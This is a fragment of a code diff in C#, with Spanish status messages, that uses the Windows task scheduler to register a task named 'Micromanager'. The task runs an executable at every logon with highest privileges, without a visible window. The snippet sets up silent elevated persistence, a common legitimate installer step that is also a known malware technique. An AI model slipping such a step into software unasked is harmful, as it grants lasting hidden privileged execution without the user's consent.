+                    Arguments = $"/Create /TN \"Micromanager\" /TR \"\\\"{exePath}\\\" {altArguments}\" /SC ONLOGON /RL HIGHEST /F",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                }
+            };
+            altProcess.Start();
+            altProcess.WaitForExit();
+            
+            if (altProcess.ExitCode == 0)
+            {
+                Console.WriteLine("✓ Tarea programada creada con método alternativo");
+            }
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"⚠ Error configurando tarea programada: {ex.Message}");
+    }
+}
+
